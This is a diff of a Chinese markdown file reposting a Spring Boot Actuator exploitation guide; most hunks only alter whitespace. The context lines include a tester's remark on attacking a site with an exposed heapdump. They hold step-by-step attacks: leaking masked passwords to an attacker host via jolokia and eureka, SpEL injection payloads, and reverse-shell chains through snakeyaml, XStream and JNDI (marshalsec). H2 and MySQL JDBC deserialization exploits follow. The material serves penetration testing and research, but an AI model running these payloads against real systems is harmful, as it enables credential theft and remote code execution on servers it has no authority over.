@@ -18,11 +18,11 @@ source: "MrWQ/vulnerability-paper"
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/7XAvvlbibo1SBmdyW2Ficz63w4yBw4ZIo5YF7n6UgpxiaQpSjPTTe7z4iceBkrZ2NrNxDT8b6ymic76g224IpGqm0SQ/640?wx_fmt=png)
 
-去世界最大的同性交友网 github.com 搜了一下 
+去世界最大的同性交友网 github.com 搜了一下 
 
 发现了一个十分详细的文章
 
-          存在大量接口信息泄露 成功交差
+          存在大量接口信息泄露 成功交差
 
 我打的网站有 heapdump
 ---------------
@@ -44,7 +44,7 @@ https://github.com/LandGrey/SpringBootVulExploit
 声明
 --
 
-> ⚠️ 本项目所有内容仅作为安全研究和授权测试使用, 相关人员对因误用和滥用该项目造成的一切损害概不负责
+> ⚠️ 本项目所有内容仅作为安全研究和授权测试使用, 相关人员对因误用和滥用该项目造成的一切损害概不负责
 
 目录
 --
@@ -362,11 +362,11 @@ https://github.com/LandGrey/SpringBootVulExploit
 
 ### 0x01：路由知识
 
-*   有些程序员会自定义 `/manage`、`/management` 、项目 App 相关名称为 spring 根路径
+*   有些程序员会自定义 `/manage`、`/management` 、项目 App 相关名称为 spring 根路径
     
-*   Spring Boot Actuator 1.x 版本默认内置路由的起始路径为 `/` ，2.x 版本则统一以 `/actuator` 为起始路径
+*   Spring Boot Actuator 1.x 版本默认内置路由的起始路径为 `/` ，2.x 版本则统一以 `/actuator` 为起始路径
     
-*   Spring Boot Actuator 默认的内置路由名字，如 `/env` 有时候也会被程序员修改，比如修改成 `/appenv`
+*   Spring Boot Actuator 默认的内置路由名字，如 `/env` 有时候也会被程序员修改，比如修改成 `/appenv`
     
 
 ### 0x02：版本知识
@@ -447,7 +447,7 @@ https://github.com/LandGrey/SpringBootVulExploit
 
 > 主要是因为程序员开发时没有意识到暴露路由可能会造成安全风险，或者没有按照标准流程开发，忘记上线时需要修改 / 切换生产环境的配置
 
-参考 production-ready-endpoints 和 spring-boot.txt，可能因为配置不当而暴露的默认内置路由可能会有：
+参考 production-ready-endpoints 和 spring-boot.txt，可能因为配置不当而暴露的默认内置路由可能会有：
 
 ```
 /actuator
@@ -501,21 +501,21 @@ https://github.com/LandGrey/SpringBootVulExploit
 
 *   `/env`、`/actuator/env`
     
-    GET 请求 `/env` 会直接泄露环境变量、内网地址、配置中的用户名等信息；当程序员的属性名命名不规范，例如 password 写成 psasword、pwd 时，会泄露密码明文；
+    GET 请求 `/env` 会直接泄露环境变量、内网地址、配置中的用户名等信息；当程序员的属性名命名不规范，例如 password 写成 psasword、pwd 时，会泄露密码明文；
     
-    同时有一定概率可以通过 POST 请求 `/env` 接口设置一些属性，间接触发相关 RCE 漏洞；同时有概率获得星号遮掩的密码、密钥等重要隐私信息的明文。
+    同时有一定概率可以通过 POST 请求 `/env` 接口设置一些属性，间接触发相关 RCE 漏洞；同时有概率获得星号遮掩的密码、密钥等重要隐私信息的明文。
     
 *   `/refresh`、`/actuator/refresh`
     
-    POST 请求 `/env` 接口设置属性后，可同时配合 POST 请求 `/refresh` 接口刷新属性变量来触发相关 RCE 漏洞。
+    POST 请求 `/env` 接口设置属性后，可同时配合 POST 请求 `/refresh` 接口刷新属性变量来触发相关 RCE 漏洞。
     
 *   `/restart`、`/actuator/restart`
     
-    暴露出此接口的情况较少；可以配合 POST 请求 `/env` 接口设置属性后，再 POST 请求 `/restart` 接口重启应用来触发相关 RCE 漏洞。
+    暴露出此接口的情况较少；可以配合 POST 请求 `/env` 接口设置属性后，再 POST 请求 `/restart` 接口重启应用来触发相关 RCE 漏洞。
     
 *   `/jolokia`、`/actuator/jolokia`
     
-    可以通过 `/jolokia/list` 接口寻找可以利用的 MBean，间接触发相关 RCE 漏洞、获得星号遮掩的重要隐私信息的明文等。
+    可以通过 `/jolokia/list` 接口寻找可以利用的 MBean，间接触发相关 RCE 漏洞、获得星号遮掩的重要隐私信息的明文等。
     
 *   `/trace`、`/actuator/httptrace`
     
@@ -528,22 +528,22 @@ https://github.com/LandGrey/SpringBootVulExploit
 
 #### 利用条件：
 
-*   目标网站存在 `/jolokia` 或 `/actuator/jolokia` 接口
+*   目标网站存在 `/jolokia` 或 `/actuator/jolokia` 接口
     
-*   目标使用了 `jolokia-core` 依赖（版本要求暂未知）
+*   目标使用了 `jolokia-core` 依赖（版本要求暂未知）
     
 
 #### 利用方法：
 
 ##### 步骤一：找到想要获取的属性名
 
-GET 请求目标网站的 `/env` 或 `/actuator/env` 接口，搜索 `******` 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。
+GET 请求目标网站的 `/env` 或 `/actuator/env` 接口，搜索 `******` 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。
 
 ##### 步骤二：jolokia 调用相关 Mbean 获取明文
 
-将下面示例中的 `security.user.password` 替换为实际要获取的属性名，直接发包；明文值结果包含在 response 数据包中的 `value` 键中。
+将下面示例中的 `security.user.password` 替换为实际要获取的属性名，直接发包；明文值结果包含在 response 数据包中的 `value` 键中。
 
-*   调用 `org.springframework.boot` Mbean
+*   调用 `org.springframework.boot` Mbean
     
 
 > 实际上是调用 org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrar 类实例的 getProperty 方法
@@ -566,7 +566,7 @@ Content-Type: application/json
 {"mbean": "org.springframework.boot:: ["security.user.password"]}
 ```
 
-*   调用 `org.springframework.cloud.context.environment` Mbean
+*   调用 `org.springframework.cloud.context.environment` Mbean
     
 
 > 实际上是调用 org.springframework.cloud.context.environment.EnvironmentManager 类实例的 getProperty 方法
@@ -598,13 +598,13 @@ Content-Type: application/json
 
 #### 利用条件：
 
-*   可以 GET 请求目标网站的 `/env`
+*   可以 GET 请求目标网站的 `/env`
     
-*   可以 POST 请求目标网站的 `/env`
+*   可以 POST 请求目标网站的 `/env`
     
-*   可以 POST 请求目标网站的 `/refresh` 接口刷新配置（存在 `spring-boot-starter-actuator` 依赖）
+*   可以 POST 请求目标网站的 `/refresh` 接口刷新配置（存在 `spring-boot-starter-actuator` 依赖）
     
-*   目标使用了 `spring-cloud-starter-netflix-eureka-client` 依赖
+*   目标使用了 `spring-cloud-starter-netflix-eureka-client` 依赖
     
 *   目标可以请求攻击者的服务器（请求可出外网）
     
@@ -613,7 +613,7 @@ Content-Type: application/json
 
 ##### 步骤一：找到想要获取的属性名
 
-GET 请求目标网站的 `/env` 或 `/actuator/env` 接口，搜索 `******` 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。
+GET 请求目标网站的 `/env` 或 `/actuator/env` 接口，搜索 `******` 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。
 
 ##### 步骤二：使用 nc 监听 HTTP 请求
 
@@ -626,9 +626,9 @@ nc -lvk 80
 
 ##### 步骤三：设置 eureka.client.serviceUrl.defaultZone 属性
 
-将下面 `http://value:${security.user.password}@your-vps-ip` 中的 `security.user.password` 换成自己想要获取的对应的星号 * 遮掩的属性名；
+将下面 `http://value:${security.user.password}@your-vps-ip` 中的 `security.user.password` 换成自己想要获取的对应的星号 * 遮掩的属性名；
 
-`your-vps-ip` 换成自己外网服务器的真实 ip 地址。
+`your-vps-ip` 换成自己外网服务器的真实 ip 地址。
 
 spring 1.x
 
@@ -676,7 +676,7 @@ Content-Type: application/json
 
 ##### 步骤五：解码属性值
 
-正常的话，此时 nc 监听的服务器会收到目标发来的请求，其中包含类似如下 `Authorization` 头内容：
+正常的话，此时 nc 监听的服务器会收到目标发来的请求，其中包含类似如下 `Authorization` 头内容：
 
 ```
 Authorization: Basic dmFsdWU6MTIzNDU2
@@ -684,24 +684,24 @@ Authorization: Basic dmFsdWU6MTIzNDU2
 
 ```
 
-将其中的 `dmFsdWU6MTIzNDU2`部分使用 base64 解码，即可获得类似明文值 `value:123456`，其中的 `123456` 即是目标星号 * 脱敏前的属性值明文。
+将其中的 `dmFsdWU6MTIzNDU2`部分使用 base64 解码，即可获得类似明文值 `value:123456`，其中的 `123456` 即是目标星号 * 脱敏前的属性值明文。
 
 ### 0x05：获取被星号脱敏的密码的明文 (方法三)
 
 #### 利用条件：
 
-*   通过 POST `/env` 设置属性触发目标对外网指定地址发起任意 http 请求
+*   通过 POST `/env` 设置属性触发目标对外网指定地址发起任意 http 请求
     
 *   目标可以请求攻击者的服务器（请求可出外网）
     
 
 #### 利用方法：
 
-> 参考 UUUUnotfound 提出的 issue-1，可以在目标发外部 http 请求的过程中，在 url path 中利用占位符带出数据
+> 参考 UUUUnotfound 提出的 issue-1，可以在目标发外部 http 请求的过程中，在 url path 中利用占位符带出数据
 
 ##### 步骤一：找到想要获取的属性名
 
-GET 请求目标网站的 `/env` 或 `/actuator/env` 接口，搜索 `******` 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。
+GET 请求目标网站的 `/env` 或 `/actuator/env` 接口，搜索 `******` 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。
 
 ##### 步骤二：使用 nc 监听 HTTP 请求
 
@@ -714,7 +714,7 @@ nc -lvk 80
 
 ##### 步骤三：触发对外 http 请求
 
-*   `spring.cloud.bootstrap.location` 方法（同时适用于明文数据中有特殊 url 字符的情况）
+*   `spring.cloud.bootstrap.location` 方法（同时适用于明文数据中有特殊 url 字符的情况）
     
 
 spring 1.x
@@ -739,7 +739,7 @@ Content-Type: application/json
 
 ```
 
-*   `eureka.client.serviceUrl.defaultZone` 方法（不适用于明文数据中有特殊 url 字符的情况）
+*   `eureka.client.serviceUrl.defaultZone` 方法（不适用于明文数据中有特殊 url 字符的情况）
     
 
 spring 1.x
@@ -792,24 +792,24 @@ Content-Type: application/json
 
 #### 利用条件：
 
-*   可正常 GET 请求目标 `/heapdump` 或 `/actuator/heapdump` 接口
+*   可正常 GET 请求目标 `/heapdump` 或 `/actuator/heapdump` 接口
     
 
 #### 利用方法：
 
 ##### 步骤一：找到想要获取的属性名
 
-GET 请求目标网站的 `/env` 或 `/actuator/env` 接口，搜索 `******` 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。
+GET 请求目标网站的 `/env` 或 `/actuator/env` 接口，搜索 `******` 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。
 
 ##### 步骤二：下载 jvm heap 信息
 
 > 下载的 heapdump 文件大小通常在 50M—500M 之间，有时候也可能会大于 2G
 
-`GET` 请求目标的 `/heapdump` 或 `/actuator/heapdump` 接口，下载应用实时的 JVM 堆信息
+`GET` 请求目标的 `/heapdump` 或 `/actuator/heapdump` 接口，下载应用实时的 JVM 堆信息
 
 ##### 步骤三：使用 MAT 获得 jvm heap 中的密码明文
 
-参考 文章 方法，使用 Eclipse Memory Analyzer 工具的 OQL 语句
+参考 文章 方法，使用 Eclipse Memory Analyzer 工具的 OQL 语句
 
 ```
 select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains("password"))
@@ -841,13 +841,13 @@ select * from java.util.LinkedHashMap$Entry x WHERE (toString(x.key).contains("p
 
 ##### 步骤一：找到一个正常传参处
 
-比如发现访问 `/article?id=xxx` ，页面会报状态码为 500 的错误： `Whitelabel Error Page`，则后续 payload 都将会在参数 id 处尝试。
+比如发现访问 `/article?id=xxx` ，页面会报状态码为 500 的错误： `Whitelabel Error Page`，则后续 payload 都将会在参数 id 处尝试。
 
 ##### 步骤二：执行 SpEL 表达式
 
-输入 `/article?id=${7*7}` ，如果发现报错页面将 7*7 的值 49 计算出来显示在报错页面上，那么基本可以确定目标存在 SpEL 表达式注入漏洞。
+输入 `/article?id=${7*7}` ，如果发现报错页面将 7*7 的值 49 计算出来显示在报错页面上，那么基本可以确定目标存在 SpEL 表达式注入漏洞。
 
-由字符串格式转换成 `0x**` java 字节形式，方便执行任意代码：
+由字符串格式转换成 `0x**` java 字节形式，方便执行任意代码：
 
 ```
 # coding: utf-8
@@ -860,7 +860,7 @@ print(result.rstrip(','))
 
 ```
 
-执行 `open -a Calculator` 命令
+执行 `open -a Calculator` 命令
 
 ```
 ${T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72}))}
@@ -869,16 +869,16 @@ ${T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{0x6f,0x70,0x65,0x
 
 #### 漏洞原理：
 
-1.  spring boot 处理参数值出错，流程进入 `org.springframework.util.PropertyPlaceholderHelper` 类中
+1.  spring boot 处理参数值出错，流程进入 `org.springframework.util.PropertyPlaceholderHelper` 类中
     
-2.  此时 URL 中的参数值会用 `parseStringValue` 方法进行递归解析
+2.  此时 URL 中的参数值会用 `parseStringValue` 方法进行递归解析
     
-3.  其中 `${}` 包围的内容都会被 `org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration` 类的 `resolvePlaceholder` 方法当作 SpEL 表达式被解析执行，造成 RCE 漏洞
+3.  其中 `${}` 包围的内容都会被 `org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration` 类的 `resolvePlaceholder` 方法当作 SpEL 表达式被解析执行，造成 RCE 漏洞
     
 
 #### 漏洞分析：
 
- SpringBoot SpEL 表达式注入漏洞 - 分析与复现
+ SpringBoot SpEL 表达式注入漏洞 - 分析与复现
 
 #### 漏洞环境：
 
@@ -892,7 +892,7 @@ http://127.0.0.1:9091/article?id=66
 
 ```
 
-执行 `open -a Calculator` 命令：
+执行 `open -a Calculator` 命令：
 
 ```
 http://127.0.0.1:9091/article?id=${T(java.lang.Runtime).getRuntime().exec(new%20String(new%20byte[]{0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72}))}
@@ -903,11 +903,11 @@ http://127.0.0.1:9091/article?id=${T(java.lang.Runtime).getRuntime().exec(new%20
 
 #### 利用条件：
 
-*   可以 POST 请求目标网站的 `/env` 接口设置属性
+*   可以 POST 请求目标网站的 `/env` 接口设置属性
     
-*   可以 POST 请求目标网站的 `/refresh` 接口刷新配置（存在 `spring-boot-starter-actuator` 依赖）
+*   可以 POST 请求目标网站的 `/refresh` 接口刷新配置（存在 `spring-boot-starter-actuator` 依赖）
     
-*   目标依赖的 `spring-cloud-starter` 版本 < 1.3.0.RELEASE
+*   目标依赖的 `spring-cloud-starter` 版本 < 1.3.0.RELEASE
     
 *   目标可以请求攻击者的 HTTP 服务器（请求可出外网）
     
@@ -926,7 +926,7 @@ python3 -m http.server 80
 
 ```
 
-在网站根目录下放置后缀为 `yml` 的文件 `example.yml`，内容如下：
+在网站根目录下放置后缀为 `yml` 的文件 `example.yml`，内容如下：
 
 ```
 !!javax.script.ScriptEngineManager [
@@ -937,7 +937,7 @@ python3 -m http.server 80
 
 ```
 
-在网站根目录下放置后缀为 `jar` 的文件 `example.jar`，内容是要执行的代码，代码编写及编译方式参考 yaml-payload。
+在网站根目录下放置后缀为 `jar` 的文件 `example.jar`，内容是要执行的代码，代码编写及编译方式参考 yaml-payload。
 
 ##### 步骤二：设置 spring.cloud.bootstrap.location 属性
 
@@ -1002,7 +1002,7 @@ Content-Type: application/json
 
 #### 漏洞分析：
 
- Exploit Spring Boot Actuator 之 Spring Cloud Env 学习笔记
+ Exploit Spring Boot Actuator 之 Spring Cloud Env 学习笔记
 
 #### 漏洞环境：
 
@@ -1020,11 +1020,11 @@ http://127.0.0.1:9092/env
 
 #### 利用条件：
 
-*   可以 POST 请求目标网站的 `/env` 接口设置属性
+*   可以 POST 请求目标网站的 `/env` 接口设置属性
     
-*   可以 POST 请求目标网站的 `/refresh` 接口刷新配置（存在 `spring-boot-starter-actuator` 依赖）
+*   可以 POST 请求目标网站的 `/refresh` 接口刷新配置（存在 `spring-boot-starter-actuator` 依赖）
     
-*   目标使用的 `eureka-client` < 1.8.7（通常包含在 `spring-cloud-starter-netflix-eureka-client` 依赖中）
+*   目标使用的 `eureka-client` < 1.8.7（通常包含在 `spring-cloud-starter-netflix-eureka-client` 依赖中）
     
 *   目标可以请求攻击者的 HTTP 服务器（请求可出外网）
     
@@ -1033,7 +1033,7 @@ http://127.0.0.1:9092/env
 
 ##### 步骤一：架设响应恶意 XStream payload 的网站
 
-提供一个依赖 Flask 并符合要求的 python 脚本示例，作用是利用目标 Linux 机器上自带的 python 来反弹 shell。
+提供一个依赖 Flask 并符合要求的 python 脚本示例，作用是利用目标 Linux 机器上自带的 python 来反弹 shell。
 
 使用 python 在自己控制的服务器上运行以上的脚本，并根据实际情况修改脚本中反弹 shell 的 ip 地址和 端口号。
 
@@ -1103,7 +1103,7 @@ Content-Type: application/json
 
 #### 漏洞分析：
 
- Spring Boot Actuator 从未授权访问到 getshell
+ Spring Boot Actuator 从未授权访问到 getshell
 
 #### 漏洞环境：
 
@@ -1121,9 +1121,9 @@ http://127.0.0.1:9093/env
 
 #### 利用条件：
 
-*   目标网站存在 `/jolokia` 或 `/actuator/jolokia` 接口
+*   目标网站存在 `/jolokia` 或 `/actuator/jolokia` 接口
     
-*   目标使用了 `jolokia-core` 依赖（版本要求暂未知）并且环境中存在相关 MBean
+*   目标使用了 `jolokia-core` 依赖（版本要求暂未知）并且环境中存在相关 MBean
     
 *   目标可以请求攻击者的 HTTP 服务器（请求可出外网）
     
@@ -1134,7 +1134,7 @@ http://127.0.0.1:9093/env
 
 ##### 步骤一：查看已存在的 MBeans
 
-访问 `/jolokia/list` 接口，查看是否存在 `ch.qos.logback.classic.jmx.JMXConfigurator` 和 `reloadByURL` 关键词。
+访问 `/jolokia/list` 接口，查看是否存在 `ch.qos.logback.classic.jmx.JMXConfigurator` 和 `reloadByURL` 关键词。
 
 ##### 步骤二：托管 xml 文件
 
@@ -1148,7 +1148,7 @@ python3 -m http.server 80
 
 ```
 
-在根目录放置以 `xml` 结尾的 `example.xml` 文件，内容如下：
+在根目录放置以 `xml` 结尾的 `example.xml` 文件，内容如下：
 
 ```
 <configuration>
@@ -1159,7 +1159,7 @@ python3 -m http.server 80
 
 ##### 步骤三：准备要执行的 Java 代码
 
-编写优化过后的用来反弹 shell 的 Java 示例代码 `JNDIObject.java`，
+编写优化过后的用来反弹 shell 的 Java 示例代码 `JNDIObject.java`，
 
 使用兼容低版本 jdk 的方式编译：
 
@@ -1168,11 +1168,11 @@ javac -source 1.5 -target 1.5 JNDIObject.java
 
 ```
 
-然后将生成的 `JNDIObject.class` 文件拷贝到 步骤二 中的网站根目录。
+然后将生成的 `JNDIObject.class` 文件拷贝到 步骤二 中的网站根目录。
 
 ##### 步骤四：架设恶意 ldap 服务
 
-下载 marshalsec ，使用下面命令架设对应的 ldap 服务：
+下载 marshalsec ，使用下面命令架设对应的 ldap 服务：
 
 ```
 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/#JNDIObject 1389
@@ -1190,7 +1190,7 @@ nc -lv 443
 
 ##### 步骤六：从外部 URL 地址加载日志配置文件
 
-> ⚠️ 如果目标成功请求了 example.xml 并且 marshalsec 也接收到了目标请求，但是目标没有请求 JNDIObject.class，大概率是因为目标环境的 jdk 版本太高，导致 JNDI 利用失败。
+> ⚠️ 如果目标成功请求了 example.xml 并且 marshalsec 也接收到了目标请求，但是目标没有请求 JNDIObject.class，大概率是因为目标环境的 jdk 版本太高，导致 JNDI 利用失败。
 
 替换实际的 your-vps-ip 地址访问 URL 触发漏洞：
 
@@ -1202,20 +1202,20 @@ nc -lv 443
 
 #### 漏洞原理：
 
-1.  直接访问可触发漏洞的 URL，相当于通过 jolokia 调用 `ch.qos.logback.classic.jmx.JMXConfigurator` 类的 `reloadByURL` 方法
+1.  直接访问可触发漏洞的 URL，相当于通过 jolokia 调用 `ch.qos.logback.classic.jmx.JMXConfigurator` 类的 `reloadByURL` 方法
     
 2.  目标机器请求外部日志配置文件 URL 地址，获得恶意 xml 文件内容
     
 3.  目标机器使用 saxParser.parse 解析 xml 文件 (这里导致了 xxe 漏洞)
     
-4.  xml 文件中利用 `logback` 依赖的 `insertFormJNDI` 标签，设置了外部 JNDI 服务器地址
+4.  xml 文件中利用 `logback` 依赖的 `insertFormJNDI` 标签，设置了外部 JNDI 服务器地址
     
 5.  目标机器请求恶意 JNDI 服务器，导致 JNDI 注入，造成 RCE 漏洞
     
 
 #### 漏洞分析：
 
- spring boot actuator rce via jolokia
+ spring boot actuator rce via jolokia
 
 #### 漏洞环境：
 
@@ -1233,9 +1233,9 @@ http://127.0.0.1:9094/env
 
 #### 利用条件：
 
-*   目标网站存在 `/jolokia` 或 `/actuator/jolokia` 接口
+*   目标网站存在 `/jolokia` 或 `/actuator/jolokia` 接口
     
-*   目标使用了 `jolokia-core` 依赖（版本要求暂未知）并且环境中存在相关 MBean
+*   目标使用了 `jolokia-core` 依赖（版本要求暂未知）并且环境中存在相关 MBean
     
 *   目标可以请求攻击者的服务器（请求可出外网）
     
@@ -1246,11 +1246,11 @@ http://127.0.0.1:9094/env
 
 ##### 步骤一：查看已存在的 MBeans
 
-访问 `/jolokia/list` 接口，查看是否存在 `type=MBeanFactory` 和 `createJNDIRealm` 关键词。
+访问 `/jolokia/list` 接口，查看是否存在 `type=MBeanFactory` 和 `createJNDIRealm` 关键词。
 
 ##### 步骤二：准备要执行的 Java 代码
 
-编写优化过后的用来反弹 shell 的 Java 示例代码 `JNDIObject.java`。
+编写优化过后的用来反弹 shell 的 Java 示例代码 `JNDIObject.java`。
 
 ##### 步骤三：托管 class 文件
 
@@ -1268,7 +1268,7 @@ python3 -m http.server 80
 
 ##### 步骤四：架设恶意 rmi 服务
 
-下载 marshalsec ，使用下面命令架设对应的 rmi 服务：
+下载 marshalsec ，使用下面命令架设对应的 rmi 服务：
 
 ```
 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://your-vps-ip:80/#JNDIObject 1389
@@ -1286,7 +1286,7 @@ nc -lvp 443
 
 ##### 步骤六：发送恶意 payload
 
-根据实际情况修改 springboot-realm-jndi-rce.py 脚本中的目标地址，RMI 地址、端口等信息，然后在自己控制的服务器上运行。
+根据实际情况修改 springboot-realm-jndi-rce.py 脚本中的目标地址，RMI 地址、端口等信息，然后在自己控制的服务器上运行。
 
 #### 漏洞原理：
 
@@ -1303,7 +1303,7 @@ nc -lvp 443
 
 #### 漏洞分析：
 
- Yet Another Way to Exploit Spring Boot Actuators via Jolokia
+ Yet Another Way to Exploit Spring Boot Actuators via Jolokia
 
 #### 漏洞环境：
 
@@ -1321,18 +1321,18 @@ http://127.0.0.1:9094/env
 
 #### 利用条件：
 
-*   可以 POST 请求目标网站的 `/env` 接口设置属性
+*   可以 POST 请求目标网站的 `/env` 接口设置属性
     
-*   可以 POST 请求目标网站的 `/restart` 接口重启应用
+*   可以 POST 请求目标网站的 `/restart` 接口重启应用
     
-*   存在 `com.h2database.h2` 依赖（版本要求暂未知）
+*   存在 `com.h2database.h2` 依赖（版本要求暂未知）
     
 
 #### 利用方法：
 
 ##### 步骤一：设置 spring.datasource.hikari.connection-test-query 属性
 
-> ⚠️ 下面 payload 中的'T5' 方法每一次执行命令后都需要更换名称 (如 T6) ，然后才能被重新创建使用，否则下次 restart 重启应用时漏洞不会被触发
+> ⚠️ 下面 payload 中的'T5' 方法每一次执行命令后都需要更换名称 (如 T6) ，然后才能被重新创建使用，否则下次 restart 重启应用时漏洞不会被触发
 
 spring 1.x（无回显执行命令）
 
@@ -1380,7 +1380,7 @@ Content-Type: application/json
 
 #### 漏洞原理：
 
-1.  spring.datasource.hikari.connection-test-query 属性被设置为一条恶意的 `CREATE ALIAS` 创建自定义函数的 SQL 语句
+1.  spring.datasource.hikari.connection-test-query 属性被设置为一条恶意的 `CREATE ALIAS` 创建自定义函数的 SQL 语句
     
 2.  其属性对应 HikariCP 数据库连接池的 connectionTestQuery 配置，定义一个新数据库连接之前被执行的 SQL 语句
     
@@ -1391,7 +1391,7 @@ Content-Type: application/json
 
 #### 漏洞分析：
 
- remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database
+ remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database
 
 #### 漏洞环境：
 
@@ -1409,9 +1409,9 @@ http://127.0.0.1:9096/actuator/env
 
 #### 利用条件：
 
-*   存在 `com.h2database.h2` 依赖（版本要求暂未知）
+*   存在 `com.h2database.h2` 依赖（版本要求暂未知）
     
-*   spring 配置中启用 h2 console `spring.h2.console.enabled=true`
+*   spring 配置中启用 h2 console `spring.h2.console.enabled=true`
     
 *   目标可以请求攻击者的服务器（请求可出外网）
     
@@ -1422,11 +1422,11 @@ http://127.0.0.1:9096/actuator/env
 
 ##### 步骤一：访问路由获得 jsessionid
 
-直接访问目标开启 h2 console 的默认路由 `/h2-console`，目标会跳转到页面 `/h2-console/login.jsp?jsessionid=xxxxxx`，记录下实际的 `jsessionid=xxxxxx` 值。
+直接访问目标开启 h2 console 的默认路由 `/h2-console`，目标会跳转到页面 `/h2-console/login.jsp?jsessionid=xxxxxx`，记录下实际的 `jsessionid=xxxxxx` 值。
 
 ##### 步骤二：准备要执行的 Java 代码
 
-编写优化过后的用来反弹 shell 的 Java 示例代码 `JNDIObject.java`，
+编写优化过后的用来反弹 shell 的 Java 示例代码 `JNDIObject.java`，
 
 使用兼容低版本 jdk 的方式编译：
 
@@ -1435,7 +1435,7 @@ javac -source 1.5 -target 1.5 JNDIObject.java
 
 ```
 
-然后将生成的 `JNDIObject.class` 文件拷贝到 步骤二 中的网站根目录。
+然后将生成的 `JNDIObject.class` 文件拷贝到 步骤二 中的网站根目录。
 
 ##### 步骤三：托管 class 文件
 
@@ -1453,7 +1453,7 @@ python3 -m http.server 80
 
 ##### 步骤四：架设恶意 ldap 服务
 
-下载 marshalsec ，使用下面命令架设对应的 ldap 服务：
+下载 marshalsec ，使用下面命令架设对应的 ldap 服务：
 
 ```
 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/#JNDIObject 1389
@@ -1471,7 +1471,7 @@ nc -lv 443
 
 ##### 步骤六：发包触发 JNDI 注入
 
-根据实际情况，替换下面数据中的 `jsessionid=xxxxxx`、`www.example.com` 和 `ldap://your-vps-ip:1389/JNDIObject`
+根据实际情况，替换下面数据中的 `jsessionid=xxxxxx`、`www.example.com` 和 `ldap://your-vps-ip:1389/JNDIObject`
 
 ```
 POST /h2-console/login.do?jsessionid=xxxxxx
@@ -1485,7 +1485,7 @@ language=en&setting=Generic+H2+%28Embedded%29&name=Generic+H2+%28Embedded%29&dri
 
 #### 漏洞分析：
 
- [Spring Boot + H2 数据库 JNDI 注入](https://mp.weixin.qq.com/s?__biz=MzI2NTM1MjQ3OA==&mid=2247483658&idx=1&sn=584710da0fbe56c1246755147bcec48e&scene=21#wechat_redirect)
+ [Spring Boot + H2 数据库 JNDI 注入](https://mp.weixin.qq.com/s?__biz=MzI2NTM1MjQ3OA==&mid=2247483658&idx=1&sn=584710da0fbe56c1246755147bcec48e&scene=21#wechat_redirect)
 
 #### 漏洞环境：
 
@@ -1503,11 +1503,11 @@ http://127.0.0.1:9096/h2-console
 
 #### 利用条件：
 
-*   可以 POST 请求目标网站的 `/env` 接口设置属性
+*   可以 POST 请求目标网站的 `/env` 接口设置属性
     
-*   可以 POST 请求目标网站的 `/refresh` 接口刷新配置（存在 `spring-boot-starter-actuator` 依赖）
+*   可以 POST 请求目标网站的 `/refresh` 接口刷新配置（存在 `spring-boot-starter-actuator` 依赖）
     
-*   目标环境中存在 `mysql-connector-java` 依赖
+*   目标环境中存在 `mysql-connector-java` 依赖
     
 *   目标可以请求攻击者的服务器（请求可出外网）
     
@@ -1516,26 +1516,26 @@ http://127.0.0.1:9096/h2-console
 
 ##### 步骤一：查看环境依赖
 
-GET 请求 `/env` 或 `/actuator/env`，搜索环境变量（classpath）中是否有 `mysql-connector-java` 关键词，并记录下其版本号（5.x 或 8.x）；
+GET 请求 `/env` 或 `/actuator/env`，搜索环境变量（classpath）中是否有 `mysql-connector-java` 关键词，并记录下其版本号（5.x 或 8.x）；
 
-搜索并观察环境变量中是否存在常见的反序列化 gadget 依赖，比如 `commons-collections`、`Jdk7u21`、`Jdk8u20` 等；
+搜索并观察环境变量中是否存在常见的反序列化 gadget 依赖，比如 `commons-collections`、`Jdk7u21`、`Jdk8u20` 等；
 
-搜索 `spring.datasource.url` 关键词，记录下其 `value` 值，方便后续恢复其正常 jdbc url 值。
+搜索 `spring.datasource.url` 关键词，记录下其 `value` 值，方便后续恢复其正常 jdbc url 值。
 
 ##### 步骤二：架设恶意 rogue mysql server
 
-在自己控制的服务器上运行 springboot-jdbc-deserialization-rce.py 脚本，并使用 ysoserial 自定义要执行的命令：
+在自己控制的服务器上运行 springboot-jdbc-deserialization-rce.py 脚本，并使用 ysoserial 自定义要执行的命令：
 
 ```
 java -jar ysoserial.jar CommonsCollections3 calc > payload.ser
 
 ```
 
-在脚本同目录下生成 `payload.ser` 反序列化 payload 文件，供脚本使用。
+在脚本同目录下生成 `payload.ser` 反序列化 payload 文件，供脚本使用。
 
 ##### 步骤三：设置 spring.datasource.url 属性
 
-> ⚠️ 修改此属性会暂时导致网站所有的正常数据库服务不可用，会对业务造成影响，请谨慎操作！
+> ⚠️ 修改此属性会暂时导致网站所有的正常数据库服务不可用，会对业务造成影响，请谨慎操作！
 
 mysql-connector-java 5.x 版本设置属性值为：
 
@@ -1599,11 +1599,11 @@ Content-Type: application/json
 
 ##### 步骤五：触发数据库查询
 
-尝试访问网站已知的数据库查询的接口，例如： `/product/list` ，或者寻找其他方式，主动触发源网站进行数据库查询，然后漏洞会被触发
+尝试访问网站已知的数据库查询的接口，例如： `/product/list` ，或者寻找其他方式，主动触发源网站进行数据库查询，然后漏洞会被触发
 
